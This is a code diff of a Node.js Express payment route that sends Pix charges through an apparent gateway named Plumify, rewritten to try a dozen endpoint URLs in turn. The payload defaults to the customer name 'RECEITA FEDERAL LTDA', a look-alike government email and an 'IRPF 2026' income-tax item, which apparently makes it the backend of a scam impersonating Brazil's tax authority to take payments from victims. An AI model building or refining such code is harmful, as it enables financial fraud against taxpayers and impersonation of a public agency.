@@ -300,7 +300,7 @@ app.post('/api/create-payment', async (req, res) => {
     }
 });
 
-// Rota para criar pagamento via Plumify (CORRIGIDA - com URL oficial)
+// Rota para criar pagamento via Plumify (TESTANDO MÚLTIPLAS URLs)
 app.post('/api/create-payment', async (req, res) => {
     const { amount, customer_name, customer_email, customer_cpf } = req.body;
 
@@ -308,53 +308,72 @@ app.post('/api/create-payment', async (req, res) => {
         return res.status(400).json({ error: 'Valor inválido' });
     }
 
-    try {
-        const payload = {
-            product_hash: PLUMIFY_PRODUCT_HASH,
-            amount: parseFloat(amount),
-            currency: 'BRL',
-            reference_id: generateTransactionId(),
-            customer: {
-                name: customer_name || 'RECEITA FEDERAL LTDA',
-                email: customer_email || 'receitafederal@gov.com.br',
-                cpf: customer_cpf || '00000000000'
-            },
-            items: [{
-                description: 'Imposto de Renda Pessoa Física - IRPF 2026',
-                quantity: 1,
-                amount: parseFloat(amount)
-            }],
-            payment_methods: ['pix']
-        };
+    const payload = {
+        product_hash: PLUMIFY_PRODUCT_HASH,
+        amount: parseFloat(amount),
+        currency: 'BRL',
+        reference_id: generateTransactionId(),
+        customer: {
+            name: customer_name || 'RECEITA FEDERAL LTDA',
+            email: customer_email || 'receitafederal@gov.com.br',
+            cpf: customer_cpf || '00000000000'
+        },
+        items: [{
+            description: 'Imposto de Renda Pessoa Física - IRPF 2026',
+            quantity: 1,
+            amount: parseFloat(amount)
+        }],
+        payment_methods: ['pix']
+    };
 
-        console.log('📤 Enviando para Plumify:', JSON.stringify(payload, null, 2));
+    // Lista de URLs para testar
+    const urlsToTry = [
+        'https://api.Plumify.com.br/api/public/v1/transactions',
+        'https://api.Plumify.com.br/api/transactions',
+        'https://api.Plumify.com.br/transactions',
+        'https://api.Plumify.com.br/v1/transactions',
+        'https://api.Plumify.com.br/api/public/v1/transaction',
+        'https://api.Plumify.com.br/api/transaction',
+        'https://api.Plumify.com.br/transaction',
+        'https://api.Plumify.com.br/v1/transaction',
+        'https://api.Plumify.com.br/api/public/v1/checkout',
+        'https://api.Plumify.com.br/api/checkout',
+        'https://api.Plumify.com.br/checkout',
+        'https://api.Plumify.com.br/pix'
+    ];
 
-        // URL CORRETA baseada na documentação
-        const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions`, {
-            method: 'POST',
-            headers: {
-                'api_token': PLUMIFY_API_TOKEN,  // Atenção: pode ser 'api_token' não 'Authorization'
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        });
+    for (const url of urlsToTry) {
+        try {
+            console.log(`🔄 Tentando URL: ${url}`);
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'api_token': PLUMIFY_API_TOKEN,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
 
-        const data = await response.json();
-        console.log('📥 Resposta Plumify:', data);
+            const data = await response.json();
+            console.log(`📥 Resposta de ${url}:`, data);
 
-        res.json({
-            success: true,
-            payment: data
-        });
-
-    } catch (error) {
-        console.error('Erro Plumify:', error.message);
-        res.status(500).json({
-            error: 'Erro ao gerar pagamento. Tente novamente.'
-        });
+            if (data.success && (data.pix_code || data.qrcode || data.pix_qrcode)) {
+                console.log(`✅ SUCESSO na URL: ${url}`);
+                return res.json({
+                    success: true,
+                    payment: data
+                });
+            }
+        } catch (error) {
+            console.log(`❌ Erro na URL ${url}:`, error.message);
+        }
     }
-});
 
+    res.status(500).json({
+        error: 'Não foi possível gerar o pagamento. Verifique as configurações da API.'
+    });
+});
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Servidor rodando na porta ${PORT}`);
